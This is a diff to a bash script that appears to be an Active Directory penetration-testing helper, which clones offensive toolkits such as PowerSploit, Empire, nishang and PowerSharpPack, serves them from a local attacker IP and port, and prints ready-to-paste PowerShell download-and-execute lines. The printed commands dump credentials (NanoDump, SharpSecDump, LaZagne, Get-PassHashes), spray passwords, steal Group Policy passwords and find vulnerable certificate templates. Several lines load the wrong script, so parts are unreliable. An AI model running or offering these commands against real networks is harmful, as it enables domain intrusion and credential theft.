@@ -6,8 +6,8 @@
 ################################################################################
 
 
-LocalIP="10.10.14.10";		#
-LocalPort="8080";		#
+LocalIP="";		#
+LocalPort="";		#
 Username="''";			#
 NQUsername="";			#
 Password="''";			#
@@ -58,7 +58,7 @@ ICYAN='\033[02;36m'
 
 
 ################################################################################
-# Repo List                                                                    #
+# Public Repo List                                                             #
 ################################################################################
 
 
@@ -100,6 +100,7 @@ EmpireLocalRepo="$HOME/ADAT/Empire"
 GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 NishangLocalRepo="$HOME/ADAT/nishang"
+PowerSharpPackLocalRepo="$HOME/ADAT/PowerSharpPack"
 PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
 PowersploitLocalRepo="$HOME/ADAT/Powersploit"
 WinPwnLocalRepo="$HOME/ADAT/WinPwn"
@@ -220,6 +221,20 @@ else
 	echo -e ""
 fi
 
+if [ -d "$PowerSharpPackRepo" ]
+then
+	echo -e ""
+    	echo -e "PowerSharpPack is installed, checking if updated to latest version."
+    	cd $PowerSharpPackLocalRepo
+    	git pull "https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning PowerSharpPack Repo${RESTORE}"
+	git clone --recursive "https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git" $HOME/ADAT/PowerSharpPack
+	echo -e ""
+fi
+
 # Copy local repo contents to single folder
 
 cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
@@ -230,6 +245,7 @@ cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Powersploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/PowerSharpPack/* $HOME/ADAT/LocalRepo
 
 # Set script repo locations to local IP and Port
 
@@ -244,13 +260,12 @@ JAWSRepo="http://$LocalIP:$LocalPort/"
 GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
 BloodHoundRepo="http://$LocalIP:$LocalPort/"
 PowersploitRepo="http://$LocalIP:$LocalPort/"
+PowerSharpPackRepo="http://$LocalIP:$LocalPort/"
 LocalRepo="True"
 
 }
 
 Internal_Menu_Host_Local(){
-
-Function_LocalRepo
 
 	clear
 	
@@ -287,6 +302,8 @@ LocalIP		:	$LocalIP
 LocalPort	:	$LocalPort
 
 "
+
+Function_LocalRepo
 echo -ne "
             Return to previous menu?
                  	
@@ -483,6 +500,7 @@ echo -e ""
 echo -e ""      
 echo -e "${LGREEN}Certificate Services${RESTORE}"
 echo -e ""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Certify.ps1);Invoke-Certify find /vulnerable"
 
 }
 
@@ -638,9 +656,9 @@ echo -e "${IBLUE}Nanodump${RESTORE}"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-NanoDump.ps1);Invoke-NanoDump"
 echo -e ""
 echo -e "${IBLUE}SharpSecDump${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
 echo -e ""
 echo -e ""
 
@@ -714,9 +732,9 @@ echo -e "${IBLUE}Nishang${RESTORE}"
 echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
 echo -e ""
 echo -e "${IBLUE}SharpSecDump${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
 echo -e ""
 echo -e ""
 
@@ -820,7 +838,7 @@ echo -e "${IBLUE}LaZagne${RESTORE}"
 echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
 echo -e ""
 echo -e "${IBLUE}SharpWeb${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Sharpweb.ps1);Invoke-Sharpweb -Command "\"full"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Sharpweb.ps1);Invoke-Sharpweb -Command "\"full"\""
 echo -e ""
 echo -e ""
 
@@ -882,7 +900,7 @@ echo -e "findstr /si pass *.xml *.doc *.txt *.xls"
 echo -e "findstr /si cred *.xml *.doc *.txt *.xls"
 echo -e ""
 echo -e "${IBLUE}Gopher${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Gopher.ps1);Invoke-Gopher"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Gopher.ps1);Invoke-Gopher"
 echo -e ""
 echo -e "${IBLUE}PowerShell${RESTORE}"
 echo -e "ls -R | select-string -Pattern 'password'"
@@ -1557,7 +1575,7 @@ echo -e ""
 echo -e "${IBLUE}Share Enumeration${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -CheckAccess"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Sharpshares.ps1);Invoke-SharpShares -Command "\"--shares"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Sharpshares.ps1);Invoke-SharpShares -Command "\"--shares"\""
 echo -e ""
 echo -e "${IBLUE}File Enumeration${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -verbose"
@@ -1627,7 +1645,7 @@ echo -e "${IBLUE}Get-GPPPassword${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
 echo -e ""
 echo -e "${IBLUE}Grouper2${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Grouper2.ps1);Invoke-Grouper2 -Command "\"-g -f Grouper2-Report.html"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Grouper2.ps1);Invoke-Grouper2 -Command "\"-g -f Grouper2-Report.html"\""
 echo -e ""
 echo -e "${IBLUE}Sherlock${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Sherlock.ps1);Find-AllVulns"
@@ -1716,8 +1734,8 @@ echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rube
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /passwords:PasswordList.txt /noticket /nowrap"\""
 echo -e ""
 echo -e "${IBLUE}SharpSpray${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray --Passwords Password1,PAsSW0rd,Qwerty123"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSpray"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-SharpSpray.ps1);Invoke-SharpSpray --Passwords Password1,PAsSW0rd,Qwerty123"
 echo -e ""
 echo -e ""
 
